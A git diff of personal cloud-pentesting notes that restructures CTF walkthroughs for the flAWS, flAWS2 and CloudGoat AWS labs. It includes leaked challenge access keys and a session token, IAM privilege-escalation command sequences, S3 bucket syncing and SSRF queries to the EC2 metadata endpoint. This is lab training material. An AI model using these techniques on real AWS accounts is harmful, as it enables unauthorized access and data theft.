@@ -1,142 +1,10 @@
-# AWS
+# CTFs
 
-## ITProTV - Intro to AWS Penetration Testing
-
-[https://www.linkedin.com/learning/introduction-to-aws-penetration-testing/](https://www.linkedin.com/learning/introduction-to-aws-penetration-testing/aws-keys?autoplay=true\&u=1504)
-
-### Basic Concepts
-
-#### AWS Pentesting Policy
-
-[https://aws.amazon.com/security/penetration-testing/](https://aws.amazon.com/security/penetration-testing/)
-
-#### AWS Keys
-
-Comprised of access ID and the secret key itself.
-
-* Create Key:
-  * IAM --> Users --> Create access key
-* View Keys:
-  * IAM --> Users --> Security Credentials --> Access key ID
-
-Find Keys:
-
-<pre class="language-bash"><code class="lang-bash"><strong># Linux Location
-</strong><strong>~/.aws/credentials
-</strong># Windows Location
-%USERPROFILE%/.aws/credentials
-# Typical Entry
-[default]
-aws_access_key_id =
-aws_secret_access_key =
-</code></pre>
-
-Check for Google dorks using ExploitDB. Ex: searching on `aws`
-
-#### IAM (Identity and Access Management) Security Issues
-
-* Create User:
-  * IAM --> Users --> add Users
-* Potential Issues
-  * Weak password security (password strength)
-  * Lack of MFA
-  * Rotating Keys / Key revocation/deactivation
-  * Too many permissions / privileges (least privileges)
-
-#### S3 (Simple Storage Service)
-
-* Create a bucket
-  * S3 --> Buckets --> Create bucket
-* Potential Issues
-  * Public buckets
-  * Permissions
-  * Bucket versioning
-
-Find Buckets:
-
-```bash
-nslookup flaws.cloud
-Address: 52.218.245.11
-
-# Reverse lookup
-nslookup 52.218.245.11
-11.245.218.52.in-addr.arpa    name = s3-website-us-west-2.amazonaws.com
-```
-
-Can also check website page source for S3 bucket URLs.
-
-#### EC2 (Elastic Compute Cloud)
-
-* After OS initial installation, update the OS/install patches (patch management)
-* Update 3rd party software and services (email server, web server, etc.)
-* AMI (Amazon Machine Image) - supported and maintained image provided by AWS that provides the information required to launch an instance
-
-#### Lambda
-
-AWS Lambda is a serverless, event-driven compute service that lets you run code for virtually any type of application or backend service without provisioning or managing servers.
-
-* Make sure the code that is passed to it is properly sanitized
-* Security misconfigurations such as permissions settings for other accounts
-* Third partly libraries that are used
-* Potential DoS if code takes input from users
-
-#### ARNs (Amazon Resource Names)
-
-A way to uniquely identify AWS resources. We require an ARN when you need to specify a resource unambiguously across all of AWS
-
-* Can potentially leak information if such details can be accessed
-* Be familiar with the Format and Paths
-
-### Tools
-
-#### AWS CLI
-
-```bash
-aws configure  #  Set Access Key ID, Secret Acces Key, Region name, output format
-aws configure --profile <name>  # Set same as above for specific profile
-aws --profile <name>
-tail .aws/credentials  # Check the credentials files
-aws help
-aws iam <tab tab>
-aws s3 <tab tab>
-```
-
-#### Pacu
-
-The Open Source AWS Exploitation Framework
-
-[https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/](https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/)
-
-```bash
-pacu  # Start up pacu
-# Create/Select a session
-Pacu () > help
-Pacu () > import_keys <profile name from .aws/credentials file>  # Import existing keys
-
-```
-
-#### AWS Bucket Dump
-
-Security Tool to Look For Interesting Files in S3 Buckets
-
-[https://github.com/jordanpotti/AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump)
-
-```bash
-# Example
-python3 AWSBucketDump.py -l BucketNmes.txt -g interesting_Keywords.txt
-```
-
-#### GrayhatWarfare
-
-Search Public Buckets
-
-[https://buckets.grayhatwarfare.com/](https://buckets.grayhatwarfare.com/)
-
-### Flaws
+## flAWS
 
 [http://flaws.cloud/](http://flaws.cloud/)
 
-#### Level 1
+### Level 1
 
 > This level is _buckets_ of fun. See if you can find the first sub-domain.
 
@@ -187,7 +55,7 @@ C:\>aws s3 ls s3://flaws.cloud --no-sign-request
 
 Found an interesting file, secret-dd02c7c.html, which did in fact get us to Level 2.
 
-#### Level 2
+### Level 2
 
 > The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the [free tier](https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free\_np/).
 
@@ -237,7 +105,7 @@ C:\>aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
 
 Found an interesting file, secret-e4443fc.html, which did in fact get us to Level 3.
 
-#### Level 3
+### Level 3
 
 > The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.
 
@@ -352,7 +220,7 @@ C:\Users\esanderford\flaws-level3>aws --profile flaws-l3 s3 ls
 
 The Level 4 bucket URL was leaked which can be navigated to get us to Level 4.
 
-#### Level 4
+### Level 4
 
 > For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
 >
@@ -443,7 +311,7 @@ Enumerate mounted filesystem/data:
 htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
 ```
 
-#### Level 5
+### Level 5
 
 > This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage:
 >
@@ -499,7 +367,7 @@ C:\>aws --profile flaws-l5 s3 ls level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.c
 
 Found an interesting path, ddcc78ff/, appended to the URL which got us to Level 6.
 
-#### Level 6
+### Level 6
 
 > For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account.
 
@@ -561,11 +429,67 @@ C:\>aws --profile flaws-l6 apigateway get-stages --rest-api-id s33ppypa75
 
 Got the necessary details to make the API request and navigated to [https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6](https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6) to get the file Level URL.
 
-### CloudGoat
+## flAWS2
+
+### Level 1
+
+> For this level, you'll need to enter the correct PIN code. The correct PIN is 100 digits long, so brute forcing it won't help.
+
+* Enter in a random numbers to see response
+  * Got a message saying "Incorrect. Try again."
+* Enter in a random letters to see response
+  * Got JavaScript popup saying that the PIN code must be a number
+* Opened Burp Suite and intercepted a request with random numbers
+  * Modified the request changing the numbers to letters
+  * Got  a Response with an error but received many AWS configurations including the AWS\_SECRET\_ACCESS\_KEY and the AWS\_ACCESS\_KEY\_ID
+
+<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">C:\>aws configure --profile flaws2
+AWS Access Key ID [None]: ASIAZQNB3KHGMTHLQQ3S
+AWS Secret Access Key [None]: 98C3WBb5rGDP5hu5FXvpNsaC+HCM5lEpchIbcMOn
+Default region name [None]: us-east-1
+Default output format [None]:
+
+set AWS_PROFILE=flaws2
+export AWS_PROFILE=flaws2
+
+C:\>aws configure set aws_session_token IQoJb3JpZ2luX2VjEG4aCXVzLWVhc3QtMSJHMEUCIFuL7zeHzp6yDqB0MevX0sNxVfCw1p+AqJRrgot53/4YAiEAq3/bSjWST+8TvX3OT0pcRKK9uP7bbOOpPW+yh7803/Yq6QII9///////////ARADGgw2NTM3MTEzMzE3ODgiDPrYO1/VrDu4yweZ1Sq9AmTVPnEgi9Y6drO0FxZhMH9u1gFGu8AQV8OPKCYxMhS3Vd+dEr5hX44OpqS10iz3D6dFhYPT4nVE/YWqZMtFCIbdCEasRaSn0LGTNqfRbjShKBhEQAL+kGPb4TkuV/R6wR0Pun6B7Ob7rr1NscImNSI4nOTFsOzUvakE9ALH0v8h9qiXv8q/0oaJudAa6AJ5yq6gVmpf15OBxnFdjPGf/YQalEw2RR0mO41HGFA8zoFKz5t7mAMInh00WUF2uU10XzWl4ooTIwPPgs1py3oOksiHBHuc2W761g58x/kwJygzLGA/FFRwhzz+o3i6YQLcH0QRCIHaOzCXWzs+JYY7XJ48XNO8ixgjbAaB4FXxmoD87N/m8jalyZFS+nUjsIh+Y/vL8hfK/xwc8/7OUG/8tgWtQ6pXJHgINVAAP2PyMKuhwqwGOp4BSfiAFylqk8Bs2Pmuf8a7UewcGpQpGwanmefDG2quEHBaW++8Sr5nAs0DVvWjRukwFENztxxhdjQ4lF7M03w6SRt4jK76SKuMSqqCJjrnLg0nKiDJ96cgNUM4xf7STSgjjSQSgTOBi7QUO28UP8yBvslYqpVnL+P39TdwiG+A/R9+1KWNz3dVM2tzwPsx21EyeWCQCZmnCw2aiNtRVbc=
+
+<strong>C:\>aws sts get-caller-identity
+</strong></code></pre>
+
+```bash
+nslookup level1.flaws2.cloud
+Server:         192.168.1.1
+Address:        192.168.1.1#53
+
+Non-authoritative answer:
+Name:   level1.flaws2.cloud
+Address: 52.217.118.213
+...
+
+nslookup 52.217.118.213
+213.118.217.52.in-addr.arpa     name = s3-website-us-east-1.amazonaws.com.
+
+aws s3 ls s3://level1.flaws2.cloud
+...
+2018-11-20 21:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
+```
+
+Navigated to level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html to get to Level 2.
+
+### Level 2
+
+
+
+### Level 3
+
+
+
+## CloudGoat
 
 [https://rhinosecuritylabs.com/aws/cloudgoat-vulnerable-design-aws-environment/](https://rhinosecuritylabs.com/aws/cloudgoat-vulnerable-design-aws-environment/)
 
-#### Configuration CloudGoat
+### Configuration CloudGoat
 
 > Will need to have the requirements mentioned on the GitHub page installed
 
@@ -577,7 +501,7 @@ pip install -r requirements.txt
 ./cloudgoat.py config whitelist --auto
 ```
 
-#### IAM PrivEsc by Rollback
+### IAM PrivEsc by Rollback
 
 ```bash
 # Check user info
@@ -601,7 +525,7 @@ aws --profile raynor iam set-default-policy-version --policy-arn <POLICY ARN> --
 aws --profile raynor s3 ls
 ```
 
-#### Lambda PrivEsc
+### Lambda PrivEsc
 
 ```bash
 aws configure --profile chris
@@ -631,7 +555,7 @@ aws --profile chris iam list-attached-user-policies --user-name <USER NAME>
 aws --profile chris s3 ls
 ```
 
-#### Cloud Breach S3
+### Cloud Breach S3
 
 <pre class="language-bash"><code class="lang-bash"># CloudGoat will provide IP address when starting up
 nslookup &#x3C;IP>  # name should specify a type of instance i.e. ec2
@@ -660,7 +584,7 @@ aws --profile waf s3 ls
 aws --profile waf s3 sync s3://&#x3C;BUCKET NAME> .
 </code></pre>
 
-#### IAM PrivEsc by Attachment
+### IAM PrivEsc by Attachment
 
 ```bash
 aws --profile kerrigan s3 ls  # Access denied
@@ -681,7 +605,7 @@ ssh -i privesc-key1.pem ubuntu@<IP>
 curl http://169.254.169.254/latest
 ```
 
-#### EC2 SSRF
+### EC2 SSRF
 
 ```bash
 aws configure
@@ -721,3 +645,8 @@ aws configure --profile s3user
 aws --profile s3user lambda list-functions
 aws --profile s3user lambda invoke --function-name <FunctionName> ./outfile.txt
 ```
+
+
+
+
+
